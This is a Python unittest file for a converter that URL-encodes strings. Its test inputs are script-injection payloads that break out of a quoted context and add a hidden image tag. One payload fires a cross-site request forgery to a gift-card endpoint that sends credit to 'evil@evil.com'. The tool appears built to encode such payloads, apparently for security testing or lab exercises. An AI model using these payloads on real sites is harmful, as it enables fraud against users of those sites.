import unittest

from sequence_escapor import escape_converter


class TestEscapeMethod(unittest.TestCase):
    def test_errors_if_string_empty(self):
        with self.assertRaises(SystemExit):
            escape_converter.converter("")

    def test_converts_approprietly(self):
        STRING = '''";var i=document.createElement('img');''' + \
                 '''i.src='http://test/image.jpg';''' + \
                 '''i.setAttribute('display', 'none');''' + \
                 '''document.body.appendChild(i);"'''

        actual = escape_converter.converter(STRING)
        expected = "%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3Bi.src%3D%27http%3A//test/image.jpg%27%3Bi.setAttribute%28%27display%27%2C%20%27none%27%29%3Bdocument.body.appendChild%28i%29%3B%22"

        self.assertEqual(expected, actual)

    def test_converts_to_csrf(self):
        STRING =  "'''\";var i=document.createElement('img');i.src='/csrf/gift-card?email=evil@evil.com&amount=100';i.setAttribute('display', 'none');document.body.appendChild(i);\"'''"

        actual = escape_converter.converter(STRING)
        expected = "%27%27%27%22%3Bvar%20i%3Ddocument.createElement%28%27img%27%29%3Bi.src%3D%27/csrf/gift-card%3Femail%3Devil%40evil.com%26amount%3D100%27%3Bi.setAttribute%28%27display%27%2C%20%27none%27%29%3Bdocument.body.appendChild%28i%29%3B%22%27%27%27"

        self.assertEqual(expected, actual)


if __name__ == '__main__':
    unittest.main()
